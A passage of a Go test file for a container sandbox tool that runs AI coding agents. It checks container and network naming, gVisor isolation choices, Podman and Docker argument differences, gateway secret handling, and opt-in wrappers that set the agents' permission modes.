	if !dropped || strings.Join(got, " ") != "create --name x --cap-drop ALL img" {
		t.Errorf("stripStorageOpt() = %v, %v", got, dropped)
	}
	if _, dropped := stripStorageOpt(got); dropped {
		t.Error("nothing should be dropped when the flag is absent")
	}
}

func TestProfileFromLabels(t *testing.T) {
	cases := map[string]string{
		"rig.profile=demo,rig.role=sandbox": "demo",
		"rig.role=sandbox,rig.profile=demo": "demo",
		"rig.role=sandbox":                  "",
		"":                                  "",
	}
	for in, want := range cases {
		if got := profileFromLabels(in); got != want {
			t.Errorf("profileFromLabels(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestNames(t *testing.T) {
	nm := &NetworkManager{}
	if nm.NetworkName("demo") != "rig-net-demo" || nm.EgressNetworkName("demo") != "rig-egress-demo" || nm.ProxyName("demo") != "rig-proxy-demo" {
		t.Error("unexpected network or proxy names")
	}
	if GatewayName("demo") != "rig-gw-demo" {
		t.Error("unexpected gateway name")
	}
	r := &Runner{}
	for instance, want := range map[int]string{0: "rig-demo", 1: "rig-demo", 2: "rig-demo-2"} {
		if got := r.ContainerName("demo", instance); got != want {
			t.Errorf("ContainerName(demo, %d) = %q, want %q", instance, got, want)
		}
	}
}

// The gateway must not run through the sandbox entrypoint, which unsets the
// RIG_MCP_* variables that carry its MCP servers' secrets.
func TestGatewayBypassesTheSandboxEntrypoint(t *testing.T) {
	args := gatewayRunArgs("docker", "work", "rig-gw-work", "/tmp/env", "/tmp/gw", GatewayOptions{Image: "rig/work:latest", Network: "rig-net-work", Runtime: "runsc"})
	joined := strings.Join(args, " ")
	if !argsContainPair(args, "--entrypoint", "/usr/local/bin/rig-helper") {
		t.Fatalf("gateway must start rig-helper directly: %s", joined)
	}
	if !strings.HasSuffix(joined, "rig/work:latest gateway --config /etc/rig-gw/gateway.json") {
		t.Errorf("unexpected command after the image: %s", joined)
	}
	if !argsContainPair(args, "--runtime", "runsc") {
		t.Error("the gateway runs under the sandbox's runtime")
	}
}

func TestResolveIsolationSkipsGVisorUnderRootlessPodman(t *testing.T) {
	info := provider.EngineInfo{Name: "podman", Rootless: true, Runtimes: []string{"crun", "runsc"}}
	auto := (&config.Profile{Security: config.SecurityConfig{Level: config.LevelStandard}}).Resolve()
	iso, err := ResolveIsolation(auto, info)
	if err != nil || iso.Level != config.IsolationContainer {
		t.Errorf("auto under rootless Podman should not pick gVisor: %+v %v", iso, err)
	}
	explicit := auto
	explicit.Isolation = config.IsolationGVisor
	if _, err := ResolveIsolation(explicit, info); err == nil {
		t.Error("asking for gVisor under rootless Podman should explain why it cannot work")
	}
	info.Rootless = false
	if iso, _ := ResolveIsolation(auto, info); iso.Level != config.IsolationGVisor {
		t.Errorf("rootful Podman can use gVisor: %+v", iso)
	}
}

func TestPodmanSandboxesAvoidEngineDNSAndExtraTmpfs(t *testing.T) {
	p := testProfile()
	p.Security.Level = config.LevelStrict
	s := spec(p)
	s.Effective = p.Resolve()
	s.Network = &NetworkSetup{Network: "rig-net-demo", ProxyIP: "10.89.0.2"}
	s.Gateway, s.GatewayIP = true, "10.89.0.3"
	args := (&Runner{name: "podman"}).buildCreateArgs(s, createOpts{name: "rig-demo"})
	if !argsContainPair(args, "--add-host", ProxyAlias+":10.89.0.2") || !argsContainPair(args, "--add-host", GatewayHost+":10.89.0.3") {
		t.Errorf("Podman sandboxes reach the proxy and gateway by address: %v", args)
	}
	if !argsContain(args, "--read-only-tmpfs=false") {
		t.Error("Podman must not add writable tmpfs mounts to a read-only image")
	}
	if args := (&Runner{name: "docker"}).buildCreateArgs(s, createOpts{name: "rig-demo"}); argsContain(args, "--read-only-tmpfs=false") || argsContain(args, "--add-host") {
		t.Errorf("Docker containers use the engine's DNS and plain --read-only: %v", args)
	}
	gw := gatewayRunArgs("podman", "demo", "rig-gw-demo", "/e", "/c", GatewayOptions{Image: "rig/demo", Network: "rig-net-demo", ProxyIP: "10.89.0.2"})
	if !argsContainPair(gw, "--add-host", ProxyAlias+":10.89.0.2") {
		t.Error("the gateway reaches the proxy by address")
	}
	if !strings.Contains(strings.Join(gw, " "), "mode=0755,U") || strings.Contains(strings.Join(gw, " "), "uid=") {
		t.Errorf("Podman takes U, not uid=, to give a tmpfs to the sandbox user: %v", gw)
	}
}

func TestAgentPermissionsInstallWrappers(t *testing.T) {
	p := testProfile()
	p.Agents = []config.AgentConfig{{ID: "claude-code"}, {ID: "pi"}}
	if bc := mustContext(t, p); bc.Files["rig/bin/claude"] != nil || strings.Contains(bc.Dockerfile, "/etc/rig/bin/*") {
		t.Error("the default (ask) must not wrap any agent")
	}

	p.Security.AgentPermissions = config.PermissionsFull
	bc := mustContext(t, p)
	w := string(bc.Files["rig/bin/claude"])
	if !strings.Contains(w, `exec "$real" '--permission-mode' 'bypassPermissions' "$@"`) {
		t.Errorf("claude wrapper:\n%s", w)
	}
	if bc.Files["rig/bin/pi"] != nil {
		t.Error("pi has no permission flags and must not be wrapped")
	}
	if !strings.Contains(bc.Dockerfile, "chmod 0755 /etc/rig/bin/*") || !strings.Contains(bc.Dockerfile, "ENV PATH=/etc/rig/bin:") {
		t.Errorf("wrappers must be executable and first on PATH:\n%s", bc.Dockerfile)
	}

	p.Security.AgentPermissions = config.PermissionsEdit
	if w := string(mustContext(t, p).Files["rig/bin/claude"]); !strings.Contains(w, "'acceptEdits'") {
		t.Errorf("edit mode wrapper:\n%s", w)
	}
}

func TestOpenCodePermissionsGoInItsConfig(t *testing.T) {
	p := testProfile()
	p.Agents = []config.AgentConfig{{ID: "opencode"}}
	p.Security.AgentPermissions = config.PermissionsEdit
	cfg := string(mustContext(t, p).Files["rig/home/.config/opencode/opencode.json"])
	if !strings.Contains(cfg, `"bash": "ask"`) || !strings.Contains(cfg, `"edit": "allow"`) {
		t.Errorf("opencode.json:\n%s", cfg)
	}
}

func TestProfileFromLabelsDockerAndPodman(t *testing.T) {
	for in, want := range map[string]string{
		"rig.profile=work,rig.role=sandbox":      "work",
		"map[rig.profile:work rig.role:sandbox]": "work",
		"map[rig.role:sandbox rig.profile:bg-2]": "bg-2",
		"map[other:x]":                           "",
		"other=x":                                "",
	} {
		if got := profileFromLabels(in); got != want {
			t.Errorf("profileFromLabels(%q) = %q, want %q", in, got, want)
		}
	}
}
